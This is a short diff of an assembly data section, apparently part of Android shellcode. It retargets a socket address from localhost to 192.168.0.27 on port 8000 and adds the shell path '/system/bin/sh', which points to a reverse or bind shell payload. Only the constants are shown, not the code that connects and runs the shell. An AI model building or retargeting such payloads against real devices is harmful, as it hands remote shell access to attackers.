@@ -37,5 +37,7 @@ Lb:
 .align 2
 SOCKADDR:
 .short 0x2
-.short 0x3412
-.byte 127,0,0,1
+.short 0x401f /* 8000 */
+.byte 192,168,0,27
+
+BINSH: .ascii "/system/bin/sh\0"
